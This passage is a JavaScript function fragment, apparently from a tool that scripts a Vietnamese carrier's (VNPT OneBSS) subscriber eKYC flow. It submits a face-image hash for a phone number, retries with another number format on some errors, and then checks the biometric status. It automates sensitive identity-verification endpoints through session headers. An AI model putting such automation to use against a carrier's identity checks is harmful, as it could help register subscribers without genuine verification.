        if(updateData.error !== "200") throw new Error('Loi update_file: ' + updateData.message);

        // Chuan hoa so dien thoai: CCBS can format 84... (quoc te)
        const phoneE164 = phone.startsWith('0') ? '84' + phone.substring(1)
                        : phone.startsWith('84') ? phone
                        : '84' + phone;
        const phone0 = phone.startsWith('84') ? '0' + phone.substring(2) : phone;

        // 13. Xac thuc hinh anh - thu ca 2 format so dien thoai
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 13/13: Xac thuc hinh anh...';

        // Thu truoc voi format 84XXXXXXXXX
        console.log(`[xacthuc_hinhanh] Thu format E164: ${phoneE164} | hash=${p_image_hash}`);
        let xacthucRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/thietbi_thuebao/xacthuc_hinhanh', {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({ p_so_tb: phoneE164, p_image_hash: p_image_hash, client_session: clientSession, menu_id: 810241 })
        });
        let xacthucData = await xacthucRes.json();
        console.log(`[xacthuc_hinhanh] ${phoneE164}:`, xacthucData.error_code, xacthucData.message?.substring(0,80));

        // Neu format 84 loi "IDG invalid" hoac "type3" thi thu format 0XXXXXXXXX
        const needRetry = xacthucData.error !== '200' && (
            xacthucData.message?.includes('IDG') || xacthucData.message?.includes('anh chan dung')
        );
        if (needRetry && phone0 !== phoneE164) {
            console.log(`[xacthuc_hinhanh] Retry voi format 0-prefix: ${phone0}`);
            xacthucRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/thietbi_thuebao/xacthuc_hinhanh', {
                method: 'POST',
                headers: { ...baseHeaders, 'Content-Type': 'application/json' },
                body: JSON.stringify({ p_so_tb: phone0, p_image_hash: p_image_hash, client_session: clientSession, menu_id: 810241 })
            });
            xacthucData = await xacthucRes.json();
            console.log(`[xacthuc_hinhanh] ${phone0}:`, xacthucData.error_code, xacthucData.message?.substring(0,80));
        }
        console.log('[xacthuc_hinhanh] final:', xacthucData);


        if (xacthucData.error === "200" || xacthucData.error_code === "BSS-00000000") {
            const prob = xacthucData.data?.prob;
            const isMatch = xacthucData.data?.is_match;
            console.log(`[xacthuc_hinhanh] ✅ prob=${prob}%, is_match=${isMatch}`);

            // 14. Kiem tra trang thai sinh trac (API cuoi cung xac nhan thanh cong)
            const checkRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/thietbi_thuebao/kiemtra_trangthai_sinhtrac', {
                method: 'POST',
                headers: { ...baseHeaders, 'Content-Type': 'application/json' },
                body: JSON.stringify({ p_so_tb: phoneE164, menu_id: 810241 })
            });
            const checkData = await checkRes.json();
            console.log('[kiemtra_trangthai_sinhtrac]:', checkData);
            
            if (checkData.error === "200" || checkData.error_code === "BSS-00000000") {
                const trangThai = checkData.data?.trang_thai || '';
                const stMsg = checkData.data?.message || checkData.message || '';
                alert(
                    `✅ XÁC THỰC eKYC THÀNH CÔNG!\n\n` +
                    `📊 Độ khớp khuôn mặt: ${prob ? prob.toFixed(2) + '%' : 'N/A'}\n` +
                    `📱 Số thuê bao: ${phone}\n` +
                    `🔖 Trạng thái: ${trangThai}\n` +
                    `📋 ${stMsg}`
                );
            } else {
                alert(`⚠️ Xác thực ảnh thành công (prob: ${prob}%) nhưng kiểm tra trạng thái thất bại:\n${checkData.message}`);
            }
        } else {
            console.error('[xacthuc_hinhanh] Lỗi:', xacthucData);
            alert(`❌ Xác thực thất bại:\n${xacthucData.message || JSON.stringify(xacthucData)}`);
        }

    } catch(err) {
        console.error(err);
        alert('Loi: ' + err.message);
    } finally {
        btnElement.classList.remove('loading');
        btnElement.innerHTML = '<i class="fa-solid fa-bolt"></i> Xac thuc';
        btnElement.disabled = false;
    }
}